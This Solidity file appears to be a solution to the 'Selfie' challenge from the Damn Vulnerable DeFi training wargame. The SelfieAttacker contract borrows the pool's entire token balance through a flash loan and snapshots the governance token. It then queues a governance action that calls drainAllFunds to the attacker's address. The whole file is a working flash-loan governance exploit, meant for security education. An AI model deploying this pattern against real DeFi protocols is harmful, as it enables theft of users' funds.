// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../../DamnValuableTokenSnapshot.sol";
import "../SelfiePool.sol";

/**
 * @title SimpleGovernance
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract SelfieAttacker {

    SelfiePool selfiePool;
    SimpleGovernance governance;
    address attacker;
    uint256 public actionId;

    constructor(address _selfiePool, address _governance) {
        selfiePool = SelfiePool(_selfiePool);
        governance = SimpleGovernance(_governance);
        attacker = msg.sender;
    }

    function initiateAttack() external {
        selfiePool.flashLoan(selfiePool.token().balanceOf(address(selfiePool)));
    }

    function receiveTokens(address token, uint256 amount) external returns(uint256) {
        DamnValuableTokenSnapshot tokenContract = DamnValuableTokenSnapshot(token);
        tokenContract.snapshot();

        actionId = governance.queueAction(
            address(selfiePool),
            abi.encodeWithSignature(
                "drainAllFunds(address)",
                attacker
            ),
            0
        );

        tokenContract.transfer(address(selfiePool), amount);

        return actionId;
    }

}
